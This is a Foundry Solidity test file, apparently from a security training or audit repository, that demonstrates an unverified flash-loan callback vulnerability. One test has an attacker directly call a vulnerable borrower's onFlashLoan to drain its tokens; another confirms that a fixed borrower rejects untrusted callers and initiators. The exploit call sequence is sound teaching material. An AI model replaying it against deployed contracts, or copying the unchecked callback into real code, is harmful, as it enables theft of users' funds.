// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, VulnerableBorrower, SafeBorrower} from "../src/flashloan/Borrower.sol";

/// PoC for an unverified flash-loan / external callback (uniswapV2Call / onFlashLoan class).
///   forge test --match-contract UnverifiedCallback -vvv
///
/// Invariant (SC05): a privileged callback may only be invoked by the trusted lender/pool, and
/// only for an operation this contract initiated. The vulnerable borrower checks neither, so a
/// direct call drains its working capital; the caller/initiator checks hold.
///
/// See docs/exploits/unverified-flashloan-callback.md
contract UnverifiedCallbackTest is Test {
    MockERC20 token;
    address lender = makeAddr("lender");
    address attacker = makeAddr("attacker");
    address beneficiary = makeAddr("beneficiary");

    function setUp() public {
        token = new MockERC20();
    }

    function test_vulnerable_directCallbackDrains() public {
        VulnerableBorrower b = new VulnerableBorrower(IERC20(address(token)), lender);
        token.mint(address(b), 100e18); // the borrower's working capital

        // Attacker calls the callback directly — no real flash loan — and points the payout at self.
        vm.prank(attacker);
        b.onFlashLoan(attacker, address(token), 0, 0, abi.encode(attacker));

        assertEq(token.balanceOf(attacker), 100e18, "attacker drained the borrower via fake callback");
        assertEq(token.balanceOf(address(b)), 0, "borrower emptied");
    }

    function test_safe_rejectsUntrustedCaller_andInitiator() public {
        SafeBorrower b = new SafeBorrower(IERC20(address(token)), lender);
        token.mint(address(b), 100e18);

        // Direct attacker call is rejected (wrong lender).
        vm.prank(attacker);
        vm.expectRevert(bytes("untrusted lender"));
        b.onFlashLoan(attacker, address(token), 0, 0, abi.encode(attacker));

        // Even the real lender can't run it for a loan the borrower didn't initiate.
        vm.prank(lender);
        vm.expectRevert(bytes("untrusted initiator"));
        b.onFlashLoan(attacker, address(token), 0, 0, abi.encode(attacker));

        assertEq(token.balanceOf(address(b)), 100e18, "funds untouched by the attack attempts");

        // The legitimate flow (lender invokes it for the borrower's own loan) still works.
        vm.prank(lender);
        b.onFlashLoan(address(b), address(token), 0, 0, abi.encode(beneficiary));
        assertEq(token.balanceOf(beneficiary), 100e18, "legit callback path functions");
    }
}
